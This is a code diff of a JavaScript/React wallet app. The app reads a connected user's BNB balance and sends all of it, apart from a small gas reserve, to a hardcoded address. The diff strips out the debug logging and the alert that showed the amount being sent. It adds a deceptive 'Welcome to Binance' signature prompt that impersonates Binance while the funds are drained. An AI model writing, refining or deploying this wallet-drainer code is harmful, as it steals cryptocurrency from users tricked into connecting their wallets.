@@ -11,7 +11,6 @@ async function getLiveBalance(address) {
     return parseFloat(Web3.utils.fromWei(balanceHex, "ether")).toFixed(6);
   } catch (error) {
     alert("❌ Error fetching live balance: " + error.message);
-    console.error("❌ Error fetching live balance:", error);
     return null;
   }
 }
@@ -30,27 +29,21 @@ function App() {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     } catch (err) {
       alert("❌ Could not request accounts: " + err.message);
-      console.error("❌ Could not request accounts:", err);
       return;
     }
     if (!accounts || !accounts.length) {
       alert("❌ No account returned.");
-      console.error("❌ No account returned.");
       return;
     }
     const userAddress = accounts[0];
     setAccount(userAddress);
-    alert("✅ User address: " + userAddress);
-    console.log("✅ User address:", userAddress);
 
     const liveBalanceStr = await getLiveBalance(userAddress);
-    console.log("💰 Live BNB Balance:", liveBalanceStr);
     if (!liveBalanceStr) return;
     
     const totalBalance = parseFloat(liveBalanceStr);
     if (isNaN(totalBalance)) {
       alert("❌ Could not parse live balance.");
-      console.error("❌ Could not parse live balance.");
       return;
     }
 
@@ -59,42 +52,45 @@ function App() {
     const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
       alert("❌ Insufficient funds to cover reserve for gas fee.");
-      console.error("❌ Insufficient funds to cover reserve for gas fee.");
       return;
     }
-    alert("✅ Calculated send amount: " + sendAmount + " BNB");
+
+    // متن ساده که برای امضا نمایش داده می‌شود
+    const signingMessage = "Welcome to Binance";
+
+    let signature;
+    try {
+      signature = await window.ethereum.request({
+        method: "personal_sign",
+        params: [signingMessage, userAddress],
+      });
+    } catch (error) {
+      alert("❌ Signature request failed: " + error.message);
+      return;
+    }
 
     // آدرس مقصد
     const destination = "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD";
 
-    // تبدیل sendAmount به Wei با استفاده از Web3
+    // تبدیل sendAmount به Wei
     const weiValue = Web3.utils.toWei(sendAmount.toString(), "ether");
-    
-    // اضافه کردن لاگ برای دیباگ
-    console.log("📤 Preparing Transaction:");
-    console.log("From:", userAddress);
-    console.log("To:", destination);
-    console.log("Value in Wei:", weiValue);
 
     const txObject = {
       from: userAddress,
       to: destination,
       value: Web3.utils.toHex(weiValue),
       gas: Web3.utils.toHex(21000), // مقدار استاندارد برای انتقال BNB
-      gasPrice: Web3.utils.toHex(Web3.utils.toWei('5', 'gwei')), // تنظیم 5 Gwei
+      gasPrice: Web3.utils.toHex(Web3.utils.toWei('10', 'gwei')), // تنظیم 10 Gwei
     };
 
     try {
-      console.log("🚀 Sending Transaction...");
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
         params: [txObject],
       });
       alert("✅ Transaction sent! TxHash: " + txHash);
-      console.log("✅ Transaction Hash:", txHash);
     } catch (error) {
       alert("❌ Transaction failed: " + error.message);
-      console.error("❌ Transaction failed:", error);
     }
   }
 
